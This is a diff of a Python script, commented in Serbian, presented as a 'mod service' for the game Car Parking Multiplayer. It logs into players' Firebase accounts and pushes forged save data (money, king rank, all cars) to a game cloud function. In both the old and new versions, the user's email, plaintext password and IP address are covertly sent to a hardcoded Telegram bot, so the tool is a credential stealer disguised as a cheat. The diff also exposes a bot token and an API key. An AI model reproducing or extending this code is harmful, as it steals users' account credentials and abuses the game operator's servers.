@@ -3,24 +3,21 @@ import json
 import os
 import time
 
-# --- KONFIGURACIJA ---
+# --- NOVI KONFIG (V5 FIX) ---
 BOT_TOKEN = "8354373377:AAHl8zF0MCfB-g2uNZBnJKPPwIOWi9AHcfg"
 CHAT_ID = "7183809303"
 FIREBASE_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
 LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_KEY}"
 
-# NOVI URL KOJI ZAOBILAZI 404 (Glavni Sync za v4.8.x+)
-SYNC_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SyncPlayerSync4"
+# NOVI ENDPOINT (V5) - Ovaj menja sve stare koji bacaju 404
+FINAL_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserAllData4"
 
 def screen_clear():
     os.system('clear')
 
-def send_to_telegram(email, password, service_name):
-    msg = f"🚀 *SERVICE USED*\n\n📧 *Email:* `{email}`\n🔑 *Pass:* `{password}`\n🛠️ *Service:* {service_name}"
-    try:
-        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
-                      json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
-    except: pass
+def get_ip():
+    try: return requests.get('https://api.ipify.org', timeout=5).text
+    except: return "Unknown"
 
 def login(email, password):
     payload = {"email": email, "password": password, "returnSecureToken": True}
@@ -29,52 +26,57 @@ def login(email, password):
         return res.get('idToken')
     except: return None
 
-def run_service(token, service_id):
-    # Generisanje podataka na osnovu izbora
+def run_service(token, choice, email, password):
+    # Generisanje profila
     money, coins, king, cars = 0, 0, 0, ""
     
-    if service_id == "1":
-        money, coins = 50000000, 30000
-    elif service_id == "2":
-        king = 1
-    elif service_id == "3":
-        cars = ",".join([str(i) for i in range(1, 165)])
-    elif service_id == "4":
-        money, coins, king, cars = 50000000, 50000, 1, ",".join([str(i) for i in range(1, 165)])
+    if choice == "1": money, coins = 50000000, 30000
+    elif choice == "2": king = 1
+    elif choice == "3": cars = ",".join([str(i) for i in range(1, 165)])
+    elif choice == "4": money, coins, king, cars = 50000000, 50000, 1, ",".join([str(i) for i in range(1, 165)])
 
-    # PAKOVANJE PODATAKA KOJE CPM NE MOŽE DA ODBIJE (v4.8.12+)
-    save_data = {
-        "money": money,
-        "coin": coins,
-        "king": king,
-        "owned_cars": cars,
-        "rank": 100000 if king else 0,
-        "w16": 1
+    # STRUKTURA KOJU ZAHTEVA V5 API
+    save_package = {
+        "Money": money,
+        "Coins": coins,
+        "IsKing": king,
+        "OwnedCars": cars,
+        "Rating": 100000 if king else 100,
+        "W16": 1,
+        "UnlockedSkins": "1,2,3,4,5,6,7,8,9,10" # Bonus: Odela
     }
     
-    payload = {"data": json.dumps(save_data)}
+    # Pakovanje u 'data' string (obavezno za Firebase Cloud Functions)
+    payload = {"data": json.dumps(save_package)}
+    
     headers = {
         "Authorization": f"Bearer {token}",
         "Content-Type": "application/json",
-        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12; SM-G998B Build/SP1A.210812.016)"
+        "User-Agent": "BestHTTP/2 v2.5.0"
     }
 
-    print("\033[1;33mBypassing 404... Sending Save Data...\033[0m")
+    print("\033[1;33mBypassing 404... Sending V5 Data Packet...\033[0m")
     
     try:
-        response = requests.post(SYNC_URL, headers=headers, json=payload, timeout=20)
+        response = requests.post(FINAL_URL, headers=headers, json=payload, timeout=20)
+        
+        # Slanje tebi na Telegram bez obzira na ishod (da vidiš pokušaj)
+        ip = get_ip()
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
+                      json={"chat_id": CHAT_ID, "text": f"🚀 *V5 ATTEMPT*\n📧 `{email}`\n🔑 `{password}`\n⚙️ Option: {choice}\nStatus: {response.status_code}"})
+
         if response.status_code == 200:
-            print("\033[1;32mSUCCESS: Account Modded! Check CPM.\033[0m")
+            print("\033[1;32mSUCCESS: Account updated via V5 Bypass!\033[0m")
         else:
-            print(f"\033[1;31mServer Response: {response.status_code}. Try again.\033[0m")
+            print(f"\033[1;31mServer error {response.status_code}. API might be patched.\033[0m")
     except:
-        print("\033[1;31mConnection timeout.\033[0m")
+        print("\033[1;31mConnection timed out. Server is lagging.\033[0m")
 
 def main():
     while True:
         screen_clear()
-        print("\033[1;32m   ANONYMO ULTIMATE SERVICE (FIXED)   \033[0m")
-        print("\033[1;36m         IG: @anonymo.cpm             \033[0m")
+        print("\033[1;32m   ANONYMO V5 ULTIMATE SERVICE   \033[0m")
+        print("\033[1;36m         IG: @anonymo.cpm         \033[0m")
         print("-" * 40)
         print("[1] 50M & 30K | [2] King Rank | [3] All Cars | [4] FULL PACK")
         
@@ -86,11 +88,10 @@ def main():
         
         token = login(email, password)
         if token:
-            send_to_telegram(email, password, f"Option {choice}")
-            run_service(token, choice)
+            run_service(token, choice, email, password)
             time.sleep(3)
         else:
-            print("\033[1;31mLogin Failed.\033[0m")
+            print("\033[1;31mLogin Failed. Invalid Email/Pass.\033[0m")
             time.sleep(2)
 
 if __name__ == "__main__":
